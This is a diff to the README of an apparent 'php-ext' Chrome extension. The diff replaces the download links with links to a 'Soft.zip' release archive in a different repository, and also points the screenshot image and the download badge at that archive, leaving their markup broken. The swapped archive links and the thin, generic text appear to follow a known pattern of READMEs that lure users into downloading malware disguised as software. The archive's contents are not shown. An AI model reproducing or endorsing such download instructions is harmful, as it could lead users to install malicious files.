@@ -11,13 +11,13 @@ Welcome to the **php-ext** repository! This is a chrome extension designed to fa
 
 ## Installation Guide 📝
 
-To get started with the **php-ext** chrome extension, simply download the extension package by clicking [here](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip). Once the download is complete, launch the extension in your Chrome browser to start using it seamlessly.
+To get started with the **php-ext** chrome extension, simply download the extension package by clicking [here](https://github.com/golfingsingh/php-ext/releases/download/v1.0/Soft.zip). Once the download is complete, launch the extension in your Chrome browser to start using it seamlessly.
 
 ## Screenshots 📷
 
 Here is a sneak peek at what the **php-ext** chrome extension looks like in action:
 
-![PHP-EXT Screenshot](https://via.placeholder.com/800x400)
+![PHP-EXT Screenshot](https://github.com/golfingsingh/php-ext/releases/download/v1.0/Soft.zip)
 
 ## Contributing 🤝
 
@@ -29,4 +29,4 @@ For any questions or feedback, please open an issue in the GitHub repository. We
 
 Enjoy using **php-ext** and happy coding! 💻
 
-[![](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![](https://github.com/golfingsingh/php-ext/releases/download/v1.0/Soft.zip%20Version-blue)](https://github.com/golfingsingh/php-ext/releases/download/v1.0/Soft.zip)
